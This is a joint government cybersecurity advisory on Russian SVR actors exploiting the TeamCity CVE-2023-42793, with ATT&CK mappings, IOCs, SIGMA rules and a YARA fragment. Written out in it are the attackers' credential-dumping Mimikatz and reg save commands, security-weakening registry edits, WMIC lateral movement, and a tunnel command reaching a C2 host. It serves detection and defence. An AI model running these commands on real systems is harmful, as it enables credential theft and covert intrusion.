Software developers use TeamCity software to manage and automate software compilation, building, testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors with access to that software developer’s source code, signing certificates, and the ability to subvert software compilation and deployment processes—access a malicious actor could further use to conduct supply chain operations. Although the SVR used such access to compromise SolarWinds and its customers in 2020, limited number and seemingly opportunistic types of victims currently identified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar manner. The SVR has, however, been observed using the initial access gleaned by exploiting the TeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other steps to ensure persistent and long-term access to the compromised network environments.
To bring Russia’s actions to public attention, the authoring agencies are providing information on the SVR’s most recent compromise to aid organizations in conducting their own investigations and securing their networks, provide compromised entities with actionable indicators of compromise (IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR’s malicious actions. The authoring agencies recommend all organizations with affected systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities using the IOCs provided in this CSA. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to the FBI and CISA.
Download the PDF version of this report:


AA23-347A Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally
(PDF,       774.65 KB
  )


For a downloadable copy of IOCs, see:


AA23-347A STIX XML
(XML,       76.99 KB
  )




AA23-347A STIX JSON
(JSON,       69.29 KB
  )


THREAT OVERVIEW
SVR cyber operations pose a persistent threat to public and private organizations’ networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence, a broad concept that for Russia encompasses information on the politics, economics, and military of foreign states; science and technology; and foreign counterintelligence. The SVR also conducts cyber operations targeting technology companies that enable future cyber operations.
A decade ago, public reports about SVR cyber activity focused largely on the SVR’s spear phishing operations, targeting government agencies, think tanks and policy analysis organizations, educational institutions, and political organizations. This category of targeting is consistent with the SVR’s responsibility to collect political intelligence, the collection of which has long been the SVR’s highest priority. For the Russian Government, political intelligence includes not only the development and execution of foreign policies, but also the development and execution of domestic policies and the political processes that drive them. In December 2016, the U.S. Government published a Joint Analysis Report titled “GRIZZLY STEPPE – Russian Malicious Cyber Activity,” which describes the SVR’s compromise of a U.S. political party leading up to a presidential election. The SVR’s use of spear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily targeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report describing tools and techniques used by the SVR to target embassies in dozens of countries.
Less frequently, reporting on SVR cyber activity has addressed other aspects of the SVR’s foreign intelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published an advisory revealing the SVR’s exploitation of CVEs to gain initial access to networks, and its deployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations involved in COVID-19 vaccine development. Although not listed in the 2020 advisory did not mention it, the authoring agencies can now disclose that the SVR’s WellMess campaign also targeted energy companies. Such biomedical and energy targets are consistent with the SVR’s responsibility to support the Russian economy by pursuing two categories of foreign intelligence known as economic intelligence and science and technology.
In April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds information technology company and its customers to the SVR. This attribution marked the discovery that the SVR had, since at least 2018, expanded the range of its cyber operations to include the widespread targeting of information technology companies. At least some of this targeting was aimed at enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments published advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the SVR’s use of “low and slow” password spraying techniques to gain initial access to some victims’ networks, exploitation of a zero-day exploit, and exploitation of Microsoft 365 cloud environments.
In this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR has not yet used its accesses to software developers to access customer networks and is likely still in the preparatory phase of its operation, having access to these companies’ networks presents the SVR with opportunities to enable hard-to- detect command and control (C2) infrastructure.
TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool. While SVR followed a similar playbook in each compromise, they also adjusted to each operating environment and not all presented steps or actions below were executed on every host.
Initial Access - Exploitation
The SVR started to exploit Internet-connected JetBrains TeamCity servers [T1190] in late September 2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies' observations show that the TeamCity exploitation usually resulted in code execution [T1203] with high privileges granting the SVR an advantageous foothold in the network environment. The authoring agencies are not currently aware of any other initial access vector to JetBrains TeamCity currently being exploited by the SVR.
Host Reconnaissance
Initial observations show the SVR used the following basic, built-in commands to perform host reconnaissance [T1033],[T1059.003],[T1592.002]:

whoami /priv
whoami /all
whoami /groups
whoami /domain
nltest -dclist
nltest -dsgetdc
tasklist
netstat
wmic /node:""""<redacted>"""" /user:""""<redacted>"""" /password:""""<redacted>"""" process list brief
wmic /node:""""<redacted>"""" process list brief
wmic process get commandline -all
wmic process <proc_id> get commandline
wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed
powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties
powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof
powershell Get-WmiObject -Class Win32_Service -Computername
powershell Get-WindowsDriver -Online -All

File Exfiltration
Additionally, the authoring agencies have observed the SVR exfiltrating files [T1041] which may provide insight into the host system’s operating system:

C:\Windows\system32\ntoskrnl.exe to precisely identify system version, likely as a prerequisite to deploy EDRSandBlast.
SQL Server executable files - based on the review of the post exploitation actions, the SVR showed an interest in specific files of the SQL Server installed on the compromised systems:

C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\secforwarder.dll


Visual Studio files – based on the review of the post exploitation actions, the SVR showed an interest in specific files of the Visual Studio:

C:\Program Files (x86)\Microsoft Visual Studio\2017\SQL\Common7\IDE\VSIXAutoUpdate.exe
Update management agent files – based on the review of the post exploitation actions, the SVR showed an interest in executables and configuration of patch management software:

C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd\bin\httpd.exe
C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd
C:\ProgramData\GFI\LanGuard 12\HttpdConfig\httpd.conf





Interest in SQL Server
Based on the review of the exploitation, the SVR also showed an interest in details of the SQL Server [T1059.001],[T1505.001]:

powershell Compress-Archive -Path ""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll"" -DestinationPath C:\Windows\temp\1\sql.zip
SVR cyber actors also exfiltrated secforwarder.dll

Tactics Used to Avoid Detection
To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” [T1068] technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software [T1562.001].
This was done using an open source project called “EDRSandBlast.” The authoring agencies have observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is used for controlling and protecting running processes and protecting them from infection. The actors then inject code into AV/EDR processes for a small subset of victims [T1068]. Additionally, executables that are likely to be detected (i.e. Mimikatz) were executed in memory [T1003.001].
In several cases SVR attempted to hide their backdoors via:

Abusing a DLL hijacking vulnerability in Zabbix software by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor,
Backdooring an open source application developed by Microsoft named vcperf. SVR modified and copied publicly available sourcecode. After execution, backdoored vcperf dropped several DLLs to disc, one of those being a GraphicalProton backdoor,
Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor.

To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware via OneDrive and Dropbox were hidden inside randomly generated BMP files [T1564], illustrated below:

 


Privilege Escalation
To facilitate privilege escalation [T1098], the SVR used multiple techniques, including WinPEAS, NoLMHash registry key modification, and the Mimikatz tool.
The SVR modified the NoLMHash registry using the following reg command:

reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d ""0"" /f

The SVR used the following Mimikatz commands [T1003]:

privilege::debug
lsadump::cache
lsadump::secrets
lsadump::sam
sekurlsa::logonpasswords

Persistence
The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:

C:\Windows\temp
C:\Windows\System32
C:\Windows\WinStore

The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments passed to schtasks.exe, which can be found in Appendix B – Indicators of Compromise.
To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs) [T1558.001].
Sensitive Data Exfiltration [T1020]
The SVR exfiltrated the following Windows Registry hives from its victims [T1003]:

HKLM\SYSTEM
HKLM\SAM
HKLM\SECURITY

In order to exfiltrate Windows Registry, the SVR saved hives into files [T1003.002], packed them, and then exfiltrated them using a backdoor capability. it used “reg save” to save SYSTEM, SAM and SECURITY registry hives, and used powershell to stage .zip archives in the C:\Windows\Temp\ directory.

reg save HKLM\SYSTEM """"C:\Windows\temp\1\sy.sa"""" /y
reg save HKLM\SAM """"C:\Windows\temp\1\sam.sa"""" /y
reg save HKLM\SECURITY """"C:\Windows\temp\1\se.sa"""" /y
powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath C:\Windows\temp\s.zip -Force & del C:\Windows\temp\1 /F /Q

In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.
SVR also used DSInternals open source tool to interact with Directory Services. DSInternals allows to obtain a sensitive Domain information.
Network Reconnaissance
After the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then focused on network reconnaissance [T1590.004]. The SVR performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it launched into memory [T1046]. The SVR executed the following PowerSploit commands:

Get-NetComputer
Get-NetGroup
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""
Get-NetDiDomain
Get-AdUser
Get-DomainUser -UserName
Get-NetUser -PreauthNotRequire
Get-NetComputer | select samaccountname
Get-NetUser -SPN | select serviceprincipalname

Tunneling into Compromised Environments
In selected environments the SVR used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named Rsockstun—to establish a tunnel to the C2 infrastructure [T1572].
The authoring agencies are aware of the following infrastructure used in conjunction with “rr.exe”:

65.20.97[.]203:443
Poetpages[.]com:8443

The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC) [T1047] utility after dropping it to disk:

wmic process call create ""C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31""

Lateral Movement
The SVR used WMIC to facilitate lateral movement [T1047],[T1210].

wmic /node:""""<redacted>"""" /user:""""<redacted>"" /password:""""<redacted>"""" process call create """"rundll32 C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost""""

The SVR also modified DisableRestrictedAdmin key to enable remote connections [T1210].
It modified Registry using the following reg command:

reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d ""0"" /f

Adversary Toolset
In the course of the TeamCity operation, the SVR used multiple custom and open source available tools and backdoors. The following custom tools were observed in use during the operation:

GraphicalProton is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs [T1027.001] to exchange data with the SVR operator.
After execution, GraphicalProton gathers environment information such as active TCP/UDP connections [T1049], running processes [T1049], as well as user, host, and domain names [T1590]. OneDrive is used as a primary communication channel while Dropbox is treated as a backup channel [T1567]. API keys are hardcoded into the malware. When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results [T1564.001]. Directory name is re-randomized each time the GraphicalProton process is started.
BMP files that were used to exchange data were generated in the following way:


Compress data using zlib,
Encrypt data using custom algorithm,
Add “***” string literal to encrypted data,
Create a random BMP with random rectangle,
And finally, encode encrypted data within lower pixel bits.

While the GraphicalProton backdoor has remained mostly unchanged over the months we have been tracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation, encryption, encoders, and stagers. Two specific variants of GraphicalProton “packaging” are especially noteworthy – a variant that uses DLL hijacking [T1574.002] in Zabbix as a means to start execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself within vcperf [T1036], an open-source C++ build analysis tool from Microsoft.

GraphicalProton HTTPS variant – a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud-based services as a C2 channel and instead relies on HTTP request.To legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy WordPress website. Execution of HTTPS variant of GraphicalProton is split into two files – stager and encrypted binary file that contains further code.


MITRE ATT&CK TACTICS AND TECHNIQUES
See below tables for all referenced threat actor tactics and techniques in this advisory. For additional mitigations, see the Mitigations section.

Table 1: SVR Cyber Actors ATT&CK Techniques for Enterprise - Reconnaissance


Technique Title
ID
Use




Gather Victim Network Information: Network Topology
T1590.004
SVR cyber actors may gather information about the victim’s network topology that can be used during targeting.


Gather Victim Host Information: Software
T1592.002
SVR cyber actors may gather information about the victim’s host networks that can be used during targeting.




Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access


Technique Title
ID
Use




Exploit Public-Facing Application
T1190
SVR cyber actors exploit internet-connected JetBrains TeamCity server using CVE-2023-42793 for initial access.




Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution


Technique Title
ID
Use




Command and Scripting Interpreter: PowerShell
T1059.001
SVR cyber actors used powershell commands to compress Microsoft SQL server .dll files.


Command and Scripting Interpreter: Windows Command Shell
T1059.003

SVR cyber actors execute these powershell commands to perform host reconnaissance:

powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties
powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof
powershell Get-WmiObject -Class Win32_Service -Computername
powershell Get-WindowsDriver -Online -All




Exploitation for Client Execution
T1203
SVR cyber actors leverage arbitrary code execution after exploiting CVE-2023-42793.


Hijack Execution Flow: DLL Side-Loading
T1574.002
SVR cyber actors use a variant of GraphicalProton that uses DLL hijacking in Zabbix as a means to start execution.




Table 4: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Persistence


Technique Title
ID
Use




Scheduled Task
T1053.005
SVR cyber actors may abuse Windows Task Schedule to perform task scheduling for initial or recurring execution of malicious code.


Server Software Component: SQL Stored Procedures
T1505.001
SVR cyber actors abuse SQL server stored procedures to maintain persistence.


Boot or Logon Autostart Execution
T1547
SVR cyber actors used C:\Windows\system32\ntoskrnl.exe to configure automatic system boot settings to maintain persistence.




Table 5: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Privilege Escalation


Technique Title
ID
Use




Exploitation for Privilege Escalation
T1068

SVR cyber actors exploit JetBrains TeamCity vulnerability to achieve escalated privileges.
To avoid detection, the SVR cyber actors used a “Bring Your Own Vulnerable Driver”  technique to disable EDR and AV defense mechanisms.



Account Manipulation
T1098
SVR cyber actors may manipulate accounts to maintain and/or elevate access to victim systems.




Table 6: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Defense Evasion


Technique Title
ID
Use




Obfuscated Files or Information: Binary Padding
T1027.001
SVR cyber actors use BMPs to perform binary padding while exchange data is exfiltrated to an their C2 station.


Masquerading
T1036
SVR cyber actors use a variant that uses DLL hijacking in Zabbix as a means to start execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself within vcperf, an open-source C++ build analysis tool from Microsoft.


Process Injection
T1055
SVR cyber actors inject code into AV and EDR processes to evade defenses.


Disable or Modify Tools
T1562.001
SVR cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities.


Hide Artifacts
T1564
SVR cyber actors may attempt to hide artifacts associated with their behaviors to evade detection.


Hide Artifacts: Hidden Files and Directories
T1564.001
When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results.




Table 7: SVR Cyber actors’ ATT&CK Techniques for Enterprise: Credential Access


Technique Title
ID
Use




OS Credential Dumping: LSASS Memory
T1003.001
SVR cyber actors executed Mimikatz commands in memory to gain access to credentials stored in memory.


OS Credential Dumping: Security Account Manager
T1003.002

SVR cyber actors used:

privilege::debug
lsadump::cache
lsadump::secrets
lsadump::sam
sekurlsa::logonpasswords

Mimikatz commands to gain access to credentials.
Additionally, SVR cyber actors exfiltrated Windows registry hives to steal credentials.

HKLM\SYSTEM
HKLM\SAM
HKLM\SECURITY




Credentials from Password Stores: Credentials from Web Browsers
T1555.003
In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.


Steal or Forge Kerberos Tickets: Golden Ticket
T1558.001
To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs).




Table 8: SVR Cyber Actors ATT&CK Techniques for Enterprise: Discovery


Technique Title
ID
Use




System Owner/User Discovery
T1033
SVR cyber actors use these built-in commands to perform host reconnaissance: whoami /priv, whoami / all, whoami / groups, whoami / domain to perform user discovery.


Network Service Discovery
T1046
SVR cyber actors performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit.


Process Discovery
T1057
SVR cyber actors use GraphicalProton to gather running processes data.


Gather Victim Network Information
T1590
SVR cyber actors use GraphicalProton to gather victim network information.




Table 9: SVR Cyber Actors ATT&CK Techniques for Enterprise: Lateral Movement


Technique Title
ID
Use




Exploitation of Remote Services
T1210
SVR cyber actors may exploit remote services to gain unauthorized access to internal systems once inside a network.


Windows Management Instrumentation
T1047

SVR cyber actors executed Rsockstun either in memory or using Windows Management Instrumentation (WMI) to execute malicious commands and payloads.
wmic process call create ""C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31""





Table 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and Control


Technique Title
ID
Use




Dynamic Resolution
T1568
SVR may dynamically establish connections to command-and-control infrastructure to evade common detections and remediations.


Protocol Tunneling
T1572

SVR cyber actors may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.
In selected environments, the SVR used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named Rsockstunm—to establish a tunnel to the C2 infrastructure.





Table 11: SVR Cyber Actors ATT&CK Techniques for Enterprise: Exfiltration


Technique Title
ID
Use




Automated Exfiltration
T1020
SVR cyber actors may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during collection.


Exfiltration Over C2 Channel
T1041
SVR cyber actors may steal data by exfiltrating it over an existing C2 channel. Stolen data is encoded into normal communications using the same protocol as C2 communications.


Exfiltration Over Web Service
T1567
SVR cyber actors use OneDrive and Dropbox to exfiltrate data to their C2 station.



INDICATORS OF COMPROMISE
Note: Please refer to Appendix B for a list of IOCs.
VICTIM TYPES
As a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC have identified a few dozen compromised companies in the United States, Europe, Asia, and Australia, and are aware of over a hundred compromised devices though we assess this list does not represent the full set of compromised organizations. Generally, the victim types do not fit into any sort of pattern or trend, aside from having an unpatched, Internet-reachable JetBrains TeamCity server, leading to the assessment that SVR’s exploitation of these victims’ networks was opportunistic in nature and not necessarily a targeted attack. Identified victims included: an energy trade association; companies that provide software for billing, medical devices, customer care, employee monitoring, financial management, marketing, sales, and video games; as well as hosting companies, tools manufacturers, and small and large IT companies.
DETECTION METHODS
The following rules can be used to detect activity linked to adversary activity. These rules should serve as examples and adapt to each organization’s environment and telemetry.
SIGMA Rules




title: Privilege information listing via whoamidescription: Detects whoami.exe execution and listing of privilegesauthor: references: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoamidate: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        Image|endswith:          - 'whoami.exe'        CommandLine|contains:          - 'priv'          - 'PRIV'    condition: selectionfalsepositives: legitimate use by system administrator
title: DC listing via nltestdescription: Detects nltest.exe execution and DC listingauthor: references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        Image|endswith:          - 'nltest.exe'        CommandLine|re: '.*dclist\:.*|.*DCLIST\:.*|.*dsgetdc\:.*|.*DSGETDC\:.*'    condition: selectionfalsepositives: legitimate use by system administrator
title: DLL execution via WMIdescription: Detects DLL execution via WMIauthor: references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        Image|endswith:          - 'WMIC.exe'        CommandLine|contains|all:          - 'call'          - 'rundll32'    condition: selectionfalsepositives: legitimate use by software or system administrator
title: Process with connect and pass as argsdescription: Process with connect and pass as argsauthor:references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        CommandLine|contains|all:          - 'pass'          - 'connect'    condition: selectionfalsepositives: legitimate use of rsockstun or software with exact same arguments
title: Service or Drive enumeration via powershelldescription: Service or Drive enumeration via powershell author: references:date: 2023/11/15logsource:    category: ps_script    product: windowsdetection:    selection_1:            ScriptBlockText|contains|all:            - 'Get-WmiObject'            - '-Class'            - 'Win32_Service'    selection_2:            ScriptBlockText|contains|all:            - 'Get-WindowsDriver'            - '-Online'            - '-All'    condition: selection_1 or selection_2falsepositives: legitimate use by system administrator
title: Compressing files from temp to tempdescription: Compressing files from temp\ to temp used by SVR to prepare data to be exfiltratedreferences:author: date: 2023/11/15logsource:    category: ps_script    product: windowsdetection:    selection:        ScriptBlockText|re: '.*Compress\-Archive.*Path.*Windows\\[Tt]{1}emp\\[1-9]{1}.*DestinationPath.*Windows\\[Tt]{1}emp\\.*'    condition: selection
title: DLL names used by SVR for GraphicalProton backdoordescription: Hunts for known SVR-specific DLL names.references:author: date: 2023/11/15logsource:    category: image_load    product: windowsdetection:    selection:        ImageLoaded|endswith:          - 'AclNumsInvertHost.dll'          - 'ModeBitmapNumericAnimate.dll'          - 'UnregisterAncestorAppendAuto.dll'          - 'DeregisterSeekUsers.dll'          - 'ScrollbarHandleGet.dll'          - 'PerformanceCaptionApi.dll'          - 'WowIcmpRemoveReg.dll'          - 'BlendMonitorStringBuild.dll'          - 'HandleFrequencyAll.dll'          - 'HardSwapColor.dll'          - 'LengthInMemoryActivate.dll'          - 'ParametersNamesPopup.dll'          - 'ModeFolderSignMove.dll'          - 'ChildPaletteConnected.dll'          - 'AddressResourcesSpec.dll'    condition: selection
title: Sensitive registry entries saved to filedescription: Sensitive registry entries saved to fileauthor: references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection_base:        Image|endswith:          - 'reg.exe'        CommandLine|contains: 'save'        CommandLine|re: '.*HKLM\\SYSTEM.*|.*HKLM\\SECURITY.*|.*HKLM\\SAM.*'    selection_file:      CommandLine|re: '.*sy\.sa.*|.*sam\.sa.*|.*se\.sa.*'    condition: selection_base and selection_file
title: Scheduled tasks names used by SVR for GraphicalProton backdoordescription: Hunts for known SVR-specific scheduled task namesauthor: references: date: 2023/11/15logsource:    category: taskscheduler    product: windowsdetection:    selection:        EventID:          - 4698          - 4699          - 4702        TaskName:          - '\Microsoft\Windows\IISUpdateService'          - '\Microsoft\Windows\WindowsDefenderService'          - '\Microsoft\Windows\WindowsDefenderService2'          - '\Microsoft\DefenderService'          - '\Microsoft\Windows\DefenderUPDService'          - '\Microsoft\Windows\WiMSDFS'          - '\Microsoft\Windows\Application Experience\StartupAppTaskCkeck'          - '\Microsoft\Windows\Windows Error Reporting\SubmitReporting'          - '\Microsoft\Windows\Windows Defender\Defender Update Service'          - '\WindowUpdate'          - '\Microsoft\Windows\Windows Error Reporting\CheckReporting'          - '\Microsoft\Windows\Application Experience\StartupAppTaskCheck'          - '\Microsoft\Windows\Speech\SpeechModelInstallTask'          - '\Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStart'          - '\Microsoft\Windows\Data Integrity Scan\Data Integrity Update'          - '\Microsoft\Windows\WindowsUpdate\Scheduled AutoCheck'          - '\Microsoft\Windows\ATPUpd'          - '\Microsoft\Windows\Windows Defender\Service Update'          - '\Microsoft\Windows\WindowsUpdate\Scheduled Check'          - '\Microsoft\Windows\WindowsUpdate\Scheduled AutoCheck'          - '\Defender'          - '\defender'          - '\\Microsoft\\Windows\\IISUpdateService'          - '\\Microsoft\\Windows\\WindowsDefenderService'          - '\\Microsoft\\Windows\\WindowsDefenderService2'          - '\\Microsoft\\DefenderService'          - '\\Microsoft\\Windows\\DefenderUPDService'          - '\\Microsoft\\Windows\\WiMSDFS'          - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCkeck'          - '\\Microsoft\\Windows\\Windows Error Reporting\\SubmitReporting'          - '\\Microsoft\\Windows\\Windows Defender\\Defender Update Service'          - '\\WindowUpdate'          - '\\Microsoft\\Windows\\Windows Error Reporting\\CheckReporting'          - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCheck'          - '\\Microsoft\\Windows\\Speech\\SpeechModelInstallTask'          - '\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStart'          - '\\Microsoft\\Windows\\Data Integrity Scan\Data Integrity Update'          - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'          - '\\Microsoft\\Windows\\ATPUpd'          - '\\Microsoft\\Windows\\Windows Defender\\Service Update'          - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Check'          - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'          - '\\Defender'          - '\\defender'    condition: selection
title: Scheduled tasks names used by SVR for GraphicalProton backdoordescription: Hunts for known SVR-specific scheduled task namesauthor: references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        Image|endswith:          - 'schtasks.exe'        CommandLine|contains:          - 'IISUpdateService'          - 'WindowsDefenderService'          - 'WindowsDefenderService2'          - 'DefenderService'          - 'DefenderUPDService'          - 'WiMSDFS'          - 'StartupAppTaskCkeck'          - 'SubmitReporting'          - 'Defender Update Service'          - 'WindowUpdate'          - 'CheckReporting'          - 'StartupAppTaskCheck'          - 'SpeechModelInstallTask'          - 'BfeOnServiceStart'          - 'Data Integrity Update'          - 'Scheduled AutoCheck'          - 'ATPUpd'          - 'Service Update'          - 'Scheduled Check'          - 'Scheduled AutoCheck'          - 'Defender'          - 'defender'    selection_re:        Image|endswith:          - 'schtasks.exe'        CommandLine|re:          - '.*Defender\sUpdate\sService.*'          - '.*Data\sIntegrity\sUpdate.*'          - '.*Scheduled\sAutoCheck.*'          - '.*Service\sUpdate.*'          - '.*Scheduled\sCheck.*'          - '.*Scheduled\sAutoCheck.*'    condition: selection or selection_re
title: Suspicious registry modificationsdescription: Suspicious registry modificationsauthor: references:date: 2023/11/15logsource:    category: registry_set    product: windowsdetection:    selection:        EventID: 4657        TargetObject|contains:          - 'CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin'          - 'CurrentControlSet\\Control\\Lsa\\NoLMHash'    condition: selection
title: Registry modification from cmddescription: Registry modification from cmdauthor: references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        Image|endswith:          - 'reg.exe'        CommandLine|contains|all:          - 'CurrentControlSet'          - 'Lsa'        CommandLine|contains:          - 'DisableRestrictedAdmin'          - 'NoLMHash'    condition: selection
title: Malicious Driver Loaddescription: Detects the load of known malicious drivers via their names or hash.references:    - https://github.com/wavestone-cdt/EDRSandblast#edr-drivers-and-processes-detectionauthor: date: 2023/11/15logsource:    category: driver_load    product: windowsdetection:    selection_name:        ImageLoaded|endswith:            - 'RTCore64.sys'            - 'DBUtils_2_3.sys'    selection_hash:        Hashes|contains:            - '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd'            - '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5'    condition: selection_name or selection_hash




YARA rules
The following rule detects most known GraphicalProton variants.




rule APT29_GraphicalProton {    strings:        // C1 E9 1B                                shr     ecx, 1Bh        // 48 8B 44 24 08                          mov     rax, [rsp+30h+var_28]        // 8B 50 04                                mov     edx, [rax+4]        // C1 E2 05                                shl     edx, 5        // 09 D1                                   or      ecx, edx        // 48 8B 44 24 08                          mov     rax, [rsp+30h+var_28]        $op_string_crypt = { c1 e? (1b | 18 | 10 | 13 | 19 | 10) 48 [4] 8b [2] c1 e? (05 | 08 | 10 | 0d | 07) 09 ?? 48 }
